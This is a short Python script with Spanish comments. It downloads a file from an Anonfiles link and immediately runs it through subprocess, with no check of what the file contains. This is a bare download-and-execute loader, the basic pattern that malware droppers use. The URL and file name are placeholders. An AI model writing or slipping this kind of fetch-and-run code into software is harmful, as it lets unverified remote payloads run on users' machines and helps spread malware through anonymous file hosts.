import requests
import subprocess

def descargar_ejecutar(url):
    """
    Descarga un archivo de un enlace específico de Anonfiles y lo ejecuta.
    """
    # Descarga el archivo
    response = requests.get(url)
    open('archivo.extension', 'wb').write(response.content)
    print("Archivo descargado")
    # Ejecuta el archivo descargado
    subprocess.call(['archivo.extension'])

url = "https://anonfiles.com/link-to-file"
descargar_ejecutar(url)
